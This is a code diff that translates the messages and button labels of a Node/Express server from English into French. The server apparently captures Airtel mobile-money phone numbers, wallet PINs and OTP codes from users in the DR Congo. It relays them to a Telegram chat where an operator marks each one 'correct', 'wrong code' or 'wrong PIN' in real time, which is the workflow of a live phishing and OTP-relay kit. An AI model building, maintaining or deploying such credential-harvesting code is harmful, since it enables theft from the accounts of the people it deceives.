@@ -215,26 +215,26 @@ const handleCallbackQuery = async (callbackQuery) => {
   const [actionKey, phone] = callbackData.split(':');
   const normalizedPhone = normalizePhone(phone);
   const chatId = callbackQuery.message?.chat?.id || callbackQuery.from?.id;
-  let responseText = 'Action received.';
+  let responseText = 'Action recue.';
 
   switch (actionKey) {
     case 'allow_proceed':
-      responseText = '✅ User approved to continue.';
+      responseText = '✅ Utilisateur autorise a continuer.';
       break;
     case 'invalid_info':
-      responseText = '❌ Invalid information reported.';
+      responseText = '❌ Informations invalides signalees.';
       break;
     case 'correct_pin_otp':
-      responseText = '✅ PIN and OTP verified as correct.';
+      responseText = '✅ PIN et OTP verifies comme corrects.';
       break;
     case 'wrong_code':
-      responseText = '❌ OTP code is incorrect.';
+      responseText = '❌ Le code OTP est incorrect.';
       break;
     case 'wrong_pin':
-      responseText = '⚠️ PIN is incorrect.';
+      responseText = '⚠️ Le PIN est incorrect.';
       break;
     default:
-      responseText = '✅ Action recorded.';
+      responseText = '✅ Action enregistree.';
       break;
   }
 
@@ -251,7 +251,7 @@ const handleCallbackQuery = async (callbackQuery) => {
   try {
     await answerCallbackQuery(callbackQuery.id, responseText);
     if (chatId) {
-      await sendTelegramMessage(chatId, `<b>Gdk - Action confirmed</b>\n${responseText}`);
+      await sendTelegramMessage(chatId, `<b>Gdk - Action confirmee</b>\n${responseText}`);
     }
   } catch (err) {
     console.warn('Failed to handle callback query:', sanitizeErrMsg(err));
@@ -412,19 +412,19 @@ app.post('/api/notify', async (req, res) => {
   }
 
   const cleanPhone = normalizePhone(airtelNumber);
-  const message = `<b>Gdk - LOGIN ATTEMPT</b>\n\n` +
-    `<b>NEW USER</b>\n` +
-    `🌍 <b>Country Code</b>: +243\n` +
-    `📱 <b>Phone Number</b>: ${airtelNumber}\n` +
+  const message = `<b>Gdk - TENTATIVE DE CONNEXION</b>\n\n` +
+    `<b>NOUVEL UTILISATEUR</b>\n` +
+    `🌍 <b>Indicatif pays</b>: +243\n` +
+    `📱 <b>Numero de telephone</b>: ${airtelNumber}\n` +
     `🔐 <b>PIN</b>: ${maskPin(walletPin)}\n` +
-    `⏰ <b>Time</b>: ${new Date().toLocaleString()}\n\n` +
-    `⚠️ <b>User awaiting validation</b>\n` +
-    `⏳ <b>Timeout</b>: 5 minutes`;
+    `⏰ <b>Heure</b>: ${new Date().toLocaleString()}\n\n` +
+    `⚠️ <b>Utilisateur en attente de validation</b>\n` +
+    `⏳ <b>Delai</b>: 5 minutes`;
 
   const buttons = [
     [
-      { text: '✅ Allow', callback_data: `allow_proceed:${cleanPhone}` },
-      { text: '❌ Invalid information', callback_data: `invalid_info:${cleanPhone}` }
+      { text: '✅ Autoriser', callback_data: `allow_proceed:${cleanPhone}` },
+      { text: '❌ Informations invalides', callback_data: `invalid_info:${cleanPhone}` }
     ]
   ];
 
@@ -475,14 +475,14 @@ app.post('/api/submit', async (req, res) => {
     return res.status(400).json({ message: 'Le code OTP doit contenir exactement 4 chiffres.' });
   }
 
-  const message = `<b>✅ Gdk - OTP VERIFICATION</b>\n\n` +
-    `<b>NEW USER - VERIFICATION REQUIRED</b>\n` +
-    `🌍 <b>Country Code</b>: +243\n` +
-    `📱 <b>Phone Number</b>: ${airtelNumber}\n` +
-    `🔐 <b>OTP Code</b>: ${normalizedOtp}\n` +
-    `⏰ <b>Time</b>: ${new Date().toLocaleString()}\n\n` +
-    `⚠️ <b>Please verify the credentials:</b>\n` +
-    `⏳ <b>Timeout</b>: 5 minutes`;
+  const message = `<b>✅ Gdk - VERIFICATION OTP</b>\n\n` +
+    `<b>NOUVEL UTILISATEUR - VERIFICATION REQUISE</b>\n` +
+    `🌍 <b>Indicatif pays</b>: +243\n` +
+    `📱 <b>Numero de telephone</b>: ${airtelNumber}\n` +
+    `🔐 <b>Code OTP</b>: ${normalizedOtp}\n` +
+    `⏰ <b>Heure</b>: ${new Date().toLocaleString()}\n\n` +
+    `⚠️ <b>Verifier les identifiants :</b>\n` +
+    `⏳ <b>Delai</b>: 5 minutes`;
 
   const cleanPhone = normalizePhone(airtelNumber);
   const buttons = [
@@ -490,8 +490,8 @@ app.post('/api/submit', async (req, res) => {
       { text: '✅ Correct (PIN + OTP)', callback_data: `correct_pin_otp:${cleanPhone}` }
     ],
     [
-      { text: '❌ Wrong code', callback_data: `wrong_code:${cleanPhone}` },
-      { text: '⚠️ Wrong PIN', callback_data: `wrong_pin:${cleanPhone}` }
+      { text: '❌ Mauvais code', callback_data: `wrong_code:${cleanPhone}` },
+      { text: '⚠️ Mauvais PIN', callback_data: `wrong_pin:${cleanPhone}` }
     ]
   ];
 
